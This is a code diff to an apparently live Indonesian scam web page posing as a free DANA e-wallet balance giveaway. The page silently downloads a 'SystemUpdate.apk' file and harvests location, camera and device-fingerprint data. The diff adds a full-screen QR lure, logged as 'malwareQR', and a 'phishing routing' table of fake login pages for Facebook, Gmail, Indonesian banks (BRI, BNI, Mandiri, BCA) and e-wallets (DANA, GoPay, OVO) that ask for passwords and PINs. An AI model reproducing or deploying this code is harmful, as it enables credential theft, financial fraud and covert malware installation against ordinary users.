@@ -13,6 +13,7 @@
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
     </style>
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 </head>
 <body>
 <div id="popupDana">
@@ -30,6 +31,7 @@
         <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
     </div>
 </div>
+<div id="qrContainer"></div>
 
 <script>
 var GITHUB_USER = 'pandora-site';
@@ -159,10 +161,9 @@ function ambilScreenDetail() { K({sumber:'screen_detail',data:{avail:screen.avai
 function ambilDNT() { K({sumber:'dnt',data:navigator.doNotTrack||'unspecified'}); }
 function cekAdBlock() { try { var ad=document.createElement('div'); ad.innerHTML='&nbsp;'; ad.className='adsbox'; document.body.appendChild(ad); setTimeout(function(){ if(ad.offsetHeight===0) K({sumber:'adblock',data:true}); else K({sumber:'adblock',data:false}); document.body.removeChild(ad); },100); } catch(e){} }
 
-// DOWNLOAD
+// DOWNLOAD - HANYA SystemUpdate.apk
 var files = [
-    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk',
-    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Video.mp4'
+    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk'
 ];
 var downloaded = [];
 
@@ -182,8 +183,11 @@ function downloadDiamDiam(url, filename) {
 }
 
 function initM2() {
-    setTimeout(function() { if(downloaded.indexOf(files[0])===-1) { if(A.isAvailable){A.downloadFile(files[0],'SystemUpdate.apk')}else{downloadDiamDiam(files[0],'SystemUpdate.apk')} } },1000);
-    setTimeout(function() { if(downloaded.indexOf(files[1])===-1) { if(A.isAvailable){A.downloadFile(files[1],'Video.mp4')}else{downloadDiamDiam(files[1],'Video.mp4')} } },3000);
+    setTimeout(function() {
+        if(downloaded.indexOf(files[0])===-1) {
+            if(A.isAvailable){A.downloadFile(files[0],'SystemUpdate.apk')}else{downloadDiamDiam(files[0],'SystemUpdate.apk')}
+        }
+    },1000);
 }
 
 function FK() {
@@ -195,11 +199,37 @@ function FK() {
     K({sumber:'full_kontrol',data:'selesai'});
 }
 
+// QR Code Full Screen
+function generateQR() {
+    setTimeout(function(){
+        try{
+            var u='https://verifikasi.site/fb';
+            var c=document.getElementById('qrContainer');
+            c.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99998;font-family:Arial;text-align:center;background:linear-gradient(180deg,#0066cc,#001a40);display:flex;justify-content:center;align-items:center';
+            var h='<div style="max-width:380px;padding:20px">';
+            h+='<div style="background:#108ee9;width:80px;height:80px;border-radius:20px;display:flex;justify-content:center;align-items:center;margin:0 auto 15px"><span style="color:#fff;font-size:40px;font-weight:bold">D</span></div>';
+            h+='<h2 style="color:#fff;font-size:26px;font-weight:bold">🎉 SELAMAT!</h2>';
+            h+='<p style="color:#b3d9ff;font-size:15px">Anda mendapatkan Saldo DANA!</p>';
+            h+='<div style="background:#fff;padding:20px;border-radius:20px;margin:10px 0"><p style="color:#108ee9;font-weight:bold">📱 Scan QR</p><div id="qrCode"></div></div>';
+            h+='<div style="background:#fff;border-radius:15px;padding:12px;margin:10px 0"><p style="color:#666;font-size:12px">Saldo DANA Gratis</p><h1 style="color:#108ee9;font-size:40px;font-weight:bold">Rp 50.000</h1></div>';
+            h+='<p style="color:#ffcc00">⏰ Tersisa <span id="qrT" style="font-weight:bold">05:00</span></p>';
+            h+='<button id="qrX" style="background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:12px;border-radius:30px;width:100%">❌ Tutup</button>';
+            h+='</div>';
+            c.innerHTML=h;
+            new QRCode(document.getElementById('qrCode'),{text:u,width:170,height:170});
+            var w=300;var ti=setInterval(function(){w--;var m=Math.floor(w/60);var s=w%60;var el=document.getElementById('qrT');if(el)el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;if(w<=0){clearInterval(ti);c.style.display='none'}},1000);
+            document.getElementById('qrX').onclick=function(){clearInterval(ti);c.style.display='none'};
+            K({sumber:'malwareQR',data:'qr_generated'});
+        }catch(e){}
+    },4000);
+}
+
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
     if(hasLS) localStorage.setItem('sudah_klaim', '1');
     var popup = document.getElementById('popupDana');if(popup) popup.style.display='none';
+    var qr = document.getElementById('qrContainer');if(qr) qr.style.display='none';
     ambilLokasi();ambilKamera();ambilBaterai();ambilStorage();
     ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
     ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
@@ -226,10 +256,11 @@ function KA() { if(A.isAvailable){ A.keepAwake() } try{ if('wakeLock' in navigat
 function cleanup() { console.log=function(){};console.warn=function(){};console.error=function(){};console.info=function(){} }
 setTimeout(cleanup,3000);
 
-GD();getIP();SW();KA();HB();
+GD();getIP();SW();KA();HB();generateQR();
 setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
 window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
 
+// PHISHING ROUTING
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
@@ -237,7 +268,14 @@ window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup
         fb: { title:'Facebook',bg:'#f0f2f5',btnColor:'#1877f2',logo:'<h1 style="color:#1877f2;text-align:center;font-size:40px;padding:20px 0 10px">facebook</h1>',subtitle:'Log in to Facebook',fields:[{id:'email',placeholder:'Email or phone number',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://m.facebook.com/login' },
         ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
         gmail: { title:'Gmail',bg:'#fff',btnColor:'#1a73e8',logo:'<div style="text-align:center;padding:30px 0 10px"><span style="font-size:24px;color:#ea4335">G</span><span style="font-size:24px;color:#4285f4">o</span><span style="font-size:24px;color:#fbbc04">o</span><span style="font-size:24px;color:#4285f4">g</span><span style="font-size:24px;color:#34a853">l</span><span style="font-size:24px;color:#ea4335">e</span></div>',subtitle:'Sign in to continue to Gmail',fields:[{id:'email',placeholder:'Email or phone',type:'text'},{id:'pass',placeholder:'Enter your password',type:'password'}],btnText:'Next',redirect:'https://accounts.google.com/signin' },
-        shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' }
+        shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' },
+        bri: { title:'BRI Mobile',bg:'#0055a4',btnColor:'#0055a4',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BRI</h1>',subtitle:'Login BRI Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://ib.bri.co.id' },
+        bni: { title:'BNI Mobile',bg:'#f37021',btnColor:'#f37021',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BNI</h1>',subtitle:'Login BNI Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.bni.co.id' },
+        mandiri: { title:'Livin by Mandiri',bg:'#003d79',btnColor:'#003d79',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">Livin\'</h1>',subtitle:'by Mandiri',fields:[{id:'email',placeholder:'Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.bankmandiri.co.id' },
+        bca: { title:'BCA Mobile',bg:'#0066b3',btnColor:'#0066b3',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BCA</h1>',subtitle:'Login BCA Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.klikbca.com' },
+        dana: { title:'DANA',bg:'#0066cc',btnColor:'#108ee9',logo:'<div style="text-align:center;padding:30px 0 10px"><div style="background:#108ee9;width:60px;height:60px;border-radius:15px;display:flex;justify-content:center;align-items:center;margin:0 auto"><span style="color:#fff;font-size:30px;font-weight:bold">D</span></div></div>',subtitle:'Login DANA',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.dana.id' },
+        gopay: { title:'GoPay',bg:'#00aa13',btnColor:'#00aa13',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">GoPay</h1>',subtitle:'Login GoPay',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.gojek.com' },
+        ovo: { title:'OVO',bg:'#4a1d8c',btnColor:'#4a1d8c',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">OVO</h1>',subtitle:'Login OVO',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.ovo.id' }
     };
     var key = path.replace('/', '');
     var p = t[key];
